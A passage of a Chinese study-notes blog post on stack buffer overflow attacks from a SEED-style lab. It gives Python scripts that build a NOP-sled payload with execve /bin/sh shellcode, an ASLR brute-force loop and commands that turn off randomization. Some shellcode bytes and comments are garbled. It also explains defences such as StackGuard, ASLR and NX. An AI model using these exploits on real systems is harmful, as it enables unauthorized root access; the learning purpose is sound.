class="comment"># push1 $0x68732f2f </span></span><br><span class="line">    <span class="string">&quot;\x68&quot;</span><span class="string">&quot;/bin&quot;</span>	<span class="comment"># push1 $0x6e69622f </span></span><br><span class="line">	<span class="string">&quot;\x89\xe3&quot;</span>		<span class="comment"># movl	%esp,%ebx </span></span><br><span class="line">    <span class="string">&quot;\x50&quot;</span>			<span class="comment"># push1	%eax</span></span><br><span class="line">	<span class="string">&quot;\x53&quot;</span>			<span class="comment"># push1 %ebx </span></span><br><span class="line">    <span class="string">&quot;\x89\xe1&quot;</span>		<span class="comment"># mov1 %esp,%ecx </span></span><br><span class="line">    <span class="string">&quot;\x99&quot;</span>			<span class="comment"># cdq </span></span><br><span class="line">    <span class="string">&quot;\xb0\x0b&quot;</span>		<span class="comment"># movb $0x0b,%al </span></span><br><span class="line">    <span class="string">&quot;\xcd\x80&quot;</span>		<span class="comment"># int $0x80</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)						    <span class="comment">#生成恶意代码的机器指令</span></span><br><span class="line">content=<span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>))  <span class="comment">#生成字节数组，即badfile文件的内容每个字节都表示NOP指令</span></span><br><span class="line">start=<span class="number">300</span>-<span class="built_in">len</span>(shellcode)</span><br><span class="line">content[start:]=shellcode					<span class="comment">#将badfile的末尾都替换成恶意代码</span></span><br><span class="line">ret=<span class="number">0xfffeaf8</span>+<span class="number">100</span>							<span class="comment">#新的返回地址的值，ebp+100？？？为什么！！！</span></span><br><span class="line">content[<span class="number">112</span>:<span class="number">116</span>]=(ret).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)<span class="comment">#将地址的值，放到ebp+4即地址字段,使用小端序（低位放在低地址）</span></span><br><span class="line">file=<span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>,<span class="string">&quot;wb&quot;</span>)					<span class="comment">#二进制写的方式打开badfile</span></span><br><span class="line">file.write(content)							<span class="comment">#写入构造好的字节数据</span></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>上文中，恶意代码入口地址使用的是0xfffeaf8+100，而不是调试得到的0xfffeaf8+8。原因是ebp&#x3D;0xfffeaf8是调试时找到，调试时的函数栈可能会压入更多的信息，导致栈更深，即ebp更。此处通过0xfffeaf8+n，增大n的偏移量来进行修正，也可以尝试不同偏移量n的情况。</li>
+<li>且恶意代码的入口地址：0xfffeaf8+n不应该在任何一个字节为00，因为00相当于字符’\0’，会导致复制字符串结束。如0xfffeaf8+8&#x3D;0xfffeb00，存在一个字节为00，当strcpy复制时，遇到00字节，会结束复制，导致恶意代码未写入栈中。</li>
+<li>在Ubuntu20.04中，调试得到的rbp&#x3D;0x7fffffffddc0</li>
+<li>故修改为如下：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret=<span class="number">0x7fffffffddc0</span>+<span class="number">100</span>							</span><br><span class="line">content[<span class="number">112</span>:<span class="number">120</span>]=(ret).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)<span class="comment">#将地址的值，放到ebp+4即地址字段,使用小端序（低位放在低地址）</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="5、实施攻击获得root权限："><a href="#5、实施攻击获得root权限：" class="headerlink" title="5、实施攻击获得root权限："></a>5、实施攻击获得root权限：</h2><ul>
+<li>运行exploit.py获得bafile：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x exploit.py</span><br><span class="line">exploit.py</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>直接exploit.py是因为脚本中的第一行#!&#x2F;usr&#x2F;bin&#x2F;python3，指定了使用的脚本解释器为python3</li>
+<li>运行stack，获得root权限的shell</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310172130048.png" alt="image-20231017213044949"></p>
+<ul>
+<li><p>如果在Ubuntu16.04或者Ubuntu12,04实验，只获得普通的shell。因为默认的&#x2F;bin&#x2F;sh连接的shell是&#x2F;bin&#x2F;dash，这个shell有Set-UID的保护机制，自动降权。</p>
+</li>
+<li><p>下面在Ubuntu20.04上测试：</p>
+</li>
+<li><p>运行stack，攻击失败了。（感觉是badfile地址的问题？使用的是Ubuntu20.04，还是乖乖地自己用gdb调试一下把）</p>
+</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310172024112.png" alt="image-20231017202414076"></p>
+<ul>
+<li>运行修改后的exploit.py，得到新的badfile，还是失败了，不过这次是运行完了foo函数，再爆出段错误！！！</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310172110677.png" alt="image-20231017211002642"></p>
+<ul>
+<li>此时错误原因应该是shellcode的机器指令的问题，教材的shellcode是针对32 位 x86 架构，Ubuntu20.04是x86-64 架构，但是也不是很懂机器指令，直接问chat-gpt得到如下修改后的shellcode，最终exploit.py如下：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">shellcode = (</span><br><span class="line">    <span class="string">&quot;\x48\x31\xc0&quot;</span>                 <span class="comment"># xor rax, rax</span></span><br><span class="line">    <span class="string">&quot;\x50&quot;</span>                         <span class="comment"># push rax</span></span><br><span class="line">    <span class="string">&quot;\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68&quot;</span>  <span class="comment"># movabs rdi, /bin/sh</span></span><br><span class="line">    <span class="string">&quot;\x48\x89\xe7&quot;</span>                 <span class="comment"># mov rdi, rdi</span></span><br><span class="line">    <span class="string">&quot;\x50&quot;</span>                         <span class="comment"># push rax</span></span><br><span class="line">    <span class="string">&quot;\x57&quot;</span>                         <span class="comment"># push rdi</span></span><br><span class="line">    <span class="string">&quot;\x48\x89\xe6&quot;</span>                 <span class="comment"># mov rsi, rdi</span></span><br><span class="line">    <span class="string">&quot;\xb0\x3b&quot;</span>                     <span class="comment"># mov al, 0x3b (execve syscall number)</span></span><br><span class="line">    <span class="string">&quot;\x0f\x05&quot;</span>                     <span class="comment"># syscall</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>))</span><br><span class="line">start = <span class="number">300</span> - <span class="built_in">len</span>(shellcode)</span><br><span class="line">content[start:] = shellcode</span><br><span class="line">ret = <span class="number">0x7fffffffeaf8</span> + <span class="number">100</span>  <span class="comment"># 新的返回地址值</span></span><br><span class="line">content[<span class="number">112</span>:<span class="number">120</span>] = ret.to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(content)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>还是不行，放弃了！！！到时候看一下这章的seed实验怎么在Ubuntu20.04上处理的</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310172129161.png" alt="image-20231017212914125"></p>
+<h1 id="六、构造恶意代码shellcode："><a href="#六、构造恶意代码shellcode：" class="headerlink" title="六、构造恶意代码shellcode："></a>六、构造恶意代码shellcode：</h1><ul>
+<li>理想的恶意代码应该是启动一个shell</li>
+</ul>
+<h2 id="1、c语言直接编译："><a href="#1、c语言直接编译：" class="headerlink" title="1、c语言直接编译："></a>1、c语言直接编译：</h2><ul>
+<li>一个简单的想法是，直接编写一个c语言程序，程序通过execve启动一个shell，编译得到的二进制可执行文件直接作为badfile。</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stddef.h&gt;</span>		<span class="comment">//定义了宏NULL</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span>		<span class="comment">//execve</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span>*name[<span class="number">2</span>];</span><br><span class="line">    name[<span class="number">0</span>]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    name[<span class="number">1</span>]=<span class="literal">NULL</span>;</span><br><span class="line">    execve(name[<span class="number">0</span>],name,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>但是这种方法行不通</p>
+</li>
+<li><p>加载器问题：</p>
+<ul>
+<li>正常的程序在运行之前需要被加载进内存，并且配置好它的运行环境。这些工作由操作系统加载器（OS  loader）执行，它负责配置内存（例如栈和堆），把程序复制进内存，调用动态链接器链接需要的库函数，等等。</li>
+<li>所有的初始化工作完成之后，main（）函数才会被触发。如果之前的任一步骤缺失，程序将无法正确运行。</li>
+<li>在缓冲区溢出攻击中，恶意代码并不是由操作系统加载的，而是直接通过内存复制载入的。因此，由于重要的初始化步骤缺失，即使能够正确地跳转到main（）函数的位置，也无法运行这个shell程序。</li>
+</ul>
+</li>
+<li><p>字符’\0’的问题，strcpy复制字符串时，遇到’\0’便会停止复制，上面的可执行文件至少存在3处：</p>
+<ul>
+<li>字符串“&#x2F;bin&#x2F;sh”末尾有一个0。</li>
+<li>程序中有两个NULL，也是0。</li>
+<li>name[0]中的0是否转化为二进制中的0取决于编译环境。</li>
+</ul>
+</li>
+</ul>
+<h2 id="2、构造shellcode核心方法："><a href="#2、构造shellcode核心方法：" class="headerlink" title="2、构造shellcode核心方法："></a>2、构造shellcode核心方法：</h2><ul>
+<li>只能直接使用汇编语言来编写，为了运行shell程序写的汇编代码称为shellcode，关键是使用execve系统调用来执行&#x2F;bin&#x2F;sh程序。</li>
+<li>使用execve系统调用需要的寄存器：<ul>
+<li>eax：必须是11,11是execve的系统调用号</li>
+<li>ebx：必须保存命令字符串的地址，即”&#x2F;bin&#x2F;sh”的地址</li>
+<li>ecx：必须保存参数数组的地址，如char* name[2]中的name，第一个元素name[1]&#x3D;”&#x2F;bin&#x2F;sh”，第二个参数name[2]&#x3D;NULL，即等于0，表示数组的结尾。</li>
+<li>edx：必须保存传给新进程的环境变量的地址，可以设置为NULL即0，表示不传递环境变量。</li>
+</ul>
+</li>
+<li>设置这几个寄存器的值很简单，重点是将需要的数据放入内存，并且准确获得它们的地址。</li>
+<li>通过缓冲区溢出放入数据的话，需要猜测字符串的位置。常用的方法是，<strong>恶意代码执行时，动态的将字符串压入栈中</strong>，因为esp总是指向栈顶，通过esp可以轻松获得压入的字符串。</li>
+<li>恶意代码不能显式出现’\0’，但是设置ecx、edx的值时又需要使用到0（用于<strong>表示栈中字符串的结束</strong>），解决办法是，通过寄存器运算得到0，0保存在寄存器中，不出现在恶意代码。<ul>
+<li>如xorl %eax,%eax，eax寄存器自身做异或运算，得到0，保存在eax中</li>
+<li>再pushl %eax，将eax的0压入栈中，从而用于表示后面要入栈的字符串的结束</li>
+</ul>
+</li>
+</ul>
+<h2 id="3、shellcode示例："><a href="#3、shellcode示例：" class="headerlink" title="3、shellcode示例："></a>3、shellcode示例：</h2><ul>
+<li>示例代码如下：<ul>
+<li>找到字符串”&#x2F;bin&#x2F;&#x2F;sh”的起始地址，保存在ebp中</li>
+<li>找到name数组的起始位置，保存在ecx中。name[0]保存”&#x2F;bin&#x2F;&#x2F;sh”的地址，name[1]&#x3D;0</li>
+<li>设置edx为0</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">shellcode=( </span><br><span class="line">    <span class="string">&quot;\x31\xc0&quot;</span> 		<span class="comment"># xorl %eax,%eax，设置eax=0</span></span><br><span class="line">    <span class="string">&quot;\x50&quot;</span>			<span class="comment"># push1 %eax ，将0入栈，后面连续压入/bin/sh，表示/bin/sh字符串的结束</span></span><br><span class="line">    <span class="string">&quot;\x68&quot;</span><span class="string">&quot;//sh&quot;</span> 	<span class="comment"># push1 $0x68732f2f，将字符串//sh压入栈，使用两个/，是为了凑足4个字节，execve可以正常解析/bin/sh</span></span><br><span class="line">    <span class="string">&quot;\x68&quot;</span><span class="string">&quot;/bin&quot;</span>	<span class="comment"># push1 $0x6e69622f ，字符串/bin入栈，此时esp指向栈顶也就是字符串/bin//sh的起始位置</span></span><br><span class="line">	<span class="string">&quot;\x89\xe3&quot;</span>		<span class="comment"># movl	%esp,%ebx ，将esp也就是字符串的起始地址，保存在ebp</span></span><br><span class="line">    <span class="string">&quot;\x50&quot;</span>			<span class="comment"># push1	%eax，构建name[1]=0</span></span><br><span class="line">	<span class="string">&quot;\x53&quot;</span>			<span class="comment"># push1 %ebx ,构建name[0]=&quot;/bin//sh&quot;的地址</span></span><br><span class="line">    <span class="string">&quot;\x89\xe1&quot;</span>		<span class="comment"># mov1 %esp,%ecx ，将name的起始地址保存在exc</span></span><br><span class="line">    <span class="string">&quot;\x99&quot;</span>			<span class="comment"># cdq ，单字节指令，可以间接将edx设为0，原理是将eax的符号位(0)复制到edx的每一位，可以节省一字节长度</span></span><br><span class="line">    <span class="string">&quot;\xb0\xOb&quot;</span>		<span class="comment"># movb $0x0b,%al，将eax设为系统调用号11</span></span><br><span class="line">    <span class="string">&quot;\xcd\x80&quot;</span>		<span class="comment"># int $0x80，执行系统调用指令</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)						    <span class="comment">#生成恶意代码的机器指令</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>Python语法分析：</p>
+<ul>
+<li>Python允许使用转义字符 <code>\x</code> 后跟两个十六进制数字来表示<strong>一个字节</strong>的值，这样可以构建包含二进制数据的字符串。</li>
+<li>Python表示字符串的连接，可以省略加号+，即”\x31\xc0””\x50”实际上等于”\x31\xc0”+”\x50”</li>
+<li>Python中使用括号()，表示将多行文本定义为一个字符串，故括号(……)实际上是定义了一个字符串</li>
+<li>字符串的方法encode(‘latin-1’)，表示将字符串进行编码，<strong>编码是将字符转换为字节的过程</strong>，函数调用的返回是一个字节序列。</li>
+<li>最后，使用shellcode接收返回的字节序列</li>
+<li>Python中，字节序列是bytes类型，字符串是str类型。</li>
+</ul>
+</li>
+<li><p>为什么使用字节序列？</p>
+<ul>
+<li>因为字符串通常与字符编码和字符集相关，实际的二进制数据可能会包含额外的数据。</li>
+<li>将字符串以二进制形式写入文件时，可能写入额外的字节。</li>
+</ul>
+</li>
+</ul>
+<h1 id="七、防御措施："><a href="#七、防御措施：" class="headerlink" title="七、防御措施："></a>七、防御措施：</h1><ul>
+<li>可以在多个地方采取防御措施：<ul>
+<li>硬件体系结构、操作系统、编译器、库、应用等。</li>
+</ul>
+</li>
+</ul>
+<h2 id="1、更安全的函数："><a href="#1、更安全的函数：" class="headerlink" title="1、更安全的函数："></a>1、更安全的函数：</h2><ul>
+<li>某些内存复制函数是靠特殊字符来判断复制是否结束，而数据又由用户决定，从而用户决定了复制的长度。</li>
+<li>安全的方法是，开发者应该指明复制的长度。</li>
+</ul>
+<h2 id="2、更安全的动态链接库："><a href="#2、更安全的动态链接库：" class="headerlink" title="2、更安全的动态链接库："></a>2、更安全的动态链接库：</h2><ul>
+<li>第一种方法，需要改动函数，对于仅有二进制程序比较困难。</li>
+<li>对于采取动态链接的可执行程序，可以构建更安全的库，让二进制程序链接到更安全的库，从而调用更安全的函数。</li>
+<li>如Bell Labs维护的libsafe函数库，基于ebp边界检测，不允许复制超出ebp的边界，</li>
+</ul>
+<h2 id="3、程序静态分析："><a href="#3、程序静态分析：" class="headerlink" title="3、程序静态分析："></a>3、程序静态分析：</h2><ul>
+<li>不解决溢出漏洞，而是提醒开发者，代码中存在不安全的代码。</li>
+<li>通常在编辑器中实现。</li>
+</ul>
+<h2 id="4、编程语言："><a href="#4、编程语言：" class="headerlink" title="4、编程语言："></a>4、编程语言：</h2><ul>
+<li>语言本身能检测处理溢出</li>
+<li>如Java、Python，提供自动的边界检查。</li>
+</ul>
+<h2 id="5、编译器："><a href="#5、编译器：" class="headerlink" title="5、编译器："></a>5、编译器：</h2><ul>
+<li>编译器能控制二进制代码中的指令，因此也能<strong>插入验证栈完整性的指令</strong>。</li>
+<li>Stackshield方法：<ul>
+<li>会备份函数的返回地址，函数返回时，比较实际返回地址与备份的是否相同。</li>
+</ul>
+</li>
+<li>Stackguard方法：<ul>
+<li>在返回地址与缓冲区之间插入一个哨兵(canary)随机数，并将哨兵备份，返回时，比较哨兵与备份的哨兵值。</li>
+</ul>
+</li>
+</ul>
+<h2 id="6、操作系统："><a href="#6、操作系统：" class="headerlink" title="6、操作系统："></a>6、操作系统：</h2><ul>
+<li>操作系统的加载器负责把程序加载进内存，并设置运行环境，因此加载器可以控制进程的内存布局。</li>
+<li>加载器的通用防御措施：地址空间布局随机化，通过增加攻击难度（如难以猜测shellcode地址）降低攻击成功的概率</li>
+</ul>
+<h2 id="7、硬件体系结构："><a href="#7、硬件体系结构：" class="headerlink" title="7、硬件体系结构："></a>7、硬件体系结构：</h2><ul>
+<li>缓冲区溢出的关键是，执行栈中的shellcode。</li>
+<li>现代CPU支持NX bit特性，即No Execute bit，将代码与数据分离。基于此特性，操作系统可以把某些区域设置为不可执行，处理器会拒绝执行这些内存区域的代码。</li>
+<li>通过把栈内存设置为不可执行，可以避免缓冲区溢出。</li>
+</ul>
+<h1 id="八、地址随机化："><a href="#八、地址随机化：" class="headerlink" title="八、地址随机化："></a>八、地址随机化：</h1><ul>
+<li>执行二进制代码时，栈中的数据的地址并没有确认，而是通过ebp，esp计算得到。</li>
+<li>因此，只要正确设置ebp、esp程序就能正常执行，而不需要固定栈的地址。</li>
+</ul>
+<h2 id="1、Linux中的地址随机化："><a href="#1、Linux中的地址随机化：" class="headerlink" title="1、Linux中的地址随机化："></a>1、Linux中的地址随机化：</h2><ul>
+<li>操作系统的加载器负责将程序加载进内存，并设置堆栈。</li>
+<li>在Linux中，在ELF加载器上实现了地址随机化。</li>
+<li>使用以下代码测试地址随机化：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span> x[<span class="number">12</span>];<span class="comment">//栈中的缓冲区</span></span><br><span class="line">	<span class="type">char</span>* y=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>)*<span class="number">12</span>);<span class="comment">//堆中的缓冲区</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address of buffer x(on stack) is 0x%x\n&quot;</span>,x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address of buffer y(on heap) is 0x%x\n&quot;</span>,y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>可以设置内核变量kernal.randomize_va_space的值，来控制随机化策略：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w kernal.randomize_va_space=0		#设置为0，关闭堆和栈的随机化</span><br><span class="line">sudo sysctl -w kernal.randomize_va_space=1		#设置为1，关闭堆，启动栈的随机化</span><br><span class="line">sudo sysctl -w kernal.randomize_va_space=2		#设置为2，启动堆和栈的随机化</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在不同随机化策略下，多次运行程序，比较地址变化</li>
+</ul>
+<h2 id="2、地址随机化的有效性："><a href="#2、地址随机化的有效性：" class="headerlink" title="2、地址随机化的有效性："></a>2、地址随机化的有效性：</h2><ul>
+<li>随机化的局限性：<ul>
+<li>彻底的随机化会导致兼容性问题。</li>
+<li>可供随机化的地址范围可能不够大，能被轻松破解。</li>
+</ul>
+</li>
+<li>衡量地址空间随机化程度的是熵，如果使用随机化的内存区域含有n个比特熵，则该区域的基地址有2^n中可能。</li>
+<li>在32Linux中，使用静态ASLR(除程序镜像外的内存都被随机化)，栈的熵为19比特，堆为13比特，显然栈的基地址只有2^19&#x3D;524288中可能性，对于程序来说，这个数字并不大，能轻松的暴力破解出来。</li>
+<li>使用以下脚本，重复发起缓冲区溢出攻击，希望能碰巧猜出随机化的栈的地址：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">SECONDS=0</span><br><span class="line">value=0</span><br><span class="line">while [ 1 ]</span><br><span class="line">	do</span><br><span class="line">	value=$(($value+1))</span><br><span class="line">	duration=$SECONDS</span><br><span class="line">	min=$(($duration/60))</span><br><span class="line">	min=$(($duration%60))</span><br><span class="line">	echo &quot;$min minutes and $sec seconds eclapsed&quot;</span><br><span class="line">	echo &quot;the program has benn running $value time so far&quot;</span><br><span class="line">	./stack#缓冲区溢出程序，如果成功利用，会阻塞循环，获得一个root的shell</span><br><span class="line">done</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>因为badfile中地址已经写死，而NOP指令大概有200条，只要猜中某一条，就能成功利用漏洞。成功率大概为200&#x2F;524288&#x3D;0.00038，失败概率为0.99962<ul>
+<li>假设执行n次，则这n次至少中一次的概率为：1-0.99962^n</li>
+<li>100次为0.037</li>
+<li>100次为0.316</li>
+<li>1000次为0.9776</li>
+<li>即大约10000次左右能猜中一次</li>
+</ul>
+</li>
+<li>运行后，成功获得了root权限的shell</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310172141336.png" alt="image-20231017214142264"></p>
+<h1 id="九、StackGuard："><a href="#九、StackGuard：" class="headerlink" title="九、StackGuard："></a>九、StackGuard：</h1><ul>
+<li>防御思想：在函数返回前检测返回地址是否被修改。</li>
+</ul>
+<h2 id="1、实现思想："><a href="#1、实现思想：" class="headerlink" title="1、实现思想："></a>1、实现思想：</h2><ul>
+<li>当返回地址被溢出攻击修改时，缓冲区到返回地址之间的所有内存值，一定也被修改了。</li>
+<li>可以在两者之间存放一个不可预测的值，称为哨兵（linux中又称为canary），用于检测。</li>
+<li>直接检测返回地址与检测哨兵的区别：<ul>
+<li>哨兵是人为设置的，能很容易确认它未被修改时的值。</li>
+<li>返回地址是运行时确认的，如果需要记住未被修改的地址，则每次调用函数都要备份一次。</li>
+</ul>
+</li>
+</ul>
+<h2 id="2、手动实现方法："><a href="#2、手动实现方法：" class="headerlink" title="2、手动实现方法："></a>2、手动实现方法：</h2><ul>
+<li>要实现哨兵，可以在函数开始时定义一个局部变量guard。（实际中，并不能保证guard的顺序一定先于其他局部变量，因为这是编译器决定）</li>
+<li>guard使用来自main函数的秘密数初始化，并将秘密数保存在不会被重写的地方，如堆、BSS段、数据段。</li>
+<li>具体代码如下：<ul>
+<li>全局变量secret保存秘密数，会被保存到数据段中。</li>
+<li>函数结束时，检测guard，未修改，则正常返回。否则直接退出程序。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> secret;</span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> guard;</span><br><span class="line">    guard=secret;</span><br><span class="line">    ……</span><br><span class="line">    <span class="keyword">if</span>(guard==secret) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="3、gcc编译器中的实现："><a href="#3、gcc编译器中的实现：" class="headerlink" title="3、gcc编译器中的实现："></a>3、gcc编译器中的实现：</h2><ul>
+<li>使用如下代码：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">foo</span><span class="params">(<span class="type">char</span>* str)</span>&#123;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">12</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(buffer,str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">	foo(argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Returned1 Properly\n&quot;</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>正常编译，发现输入大于缓冲区的参数，会触发StackGuard：</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310172205822.png" alt="image-20231017220539760"></p>
+<ul>
+<li>生成汇编代码分析：gcc -S prog.c</li>
+<li>找到foo函数，设置哨兵的汇编代码：<ul>
+<li>从gs寄存器指向的内存中，偏移20的地址处，取得一个值。gs寄存器指向栈外的内存区域。</li>
+<li>接着取出的值，被赋给了ebp-12处。</li>
+<li>从而推断出gs:20保存了秘密数。</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310172207568.png" alt="image-20231017220706495"></p>
+<ul>
+<li>foo函数结束，比较guard：<ul>
+<li>取出guard，然后gs:20的秘密数与guard异或，正常结果应该是eax&#x3D;0</li>
+<li>je检测是否是0，是则跳转.L2，函数正常返回</li>
+<li>否则触发StackGuard</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310172210853.png" alt="image-20231017221049732"></p>
+<ul>
+<li>canary的条件：<ul>
+<li>随机的：可以使用&#x2F;dev&#x2F;urandom初始化来确保</li>
+<li>备份不再栈中：使用gs寄存器<ul>
+<li>在Linux中gs寄存器指向的内存不同于堆、栈、代码段等，物理上与栈隔离</li>
+<li>x86-32架构中，canary保存在gs:20</li>
+<li>x86-64架构中，canary保存在gs:40</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="十、攻破Bash与Dash的防御机制："><a href="#十、攻破Bash与Dash的防御机制：" class="headerlink" title="十、攻破Bash与Dash的防御机制："></a>十、攻破Bash与Dash的防御机制：</h1><ul>
+<li>当Bash和Dash发现EUID与RUID不同时，会立刻将EUID变为RUID，主动降权。</li>
+<li>查看Dash更新日志，可以看到增加了对euid和egid的检测</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310172218984.png" alt="image-20231017221824856"></p>
+<ul>
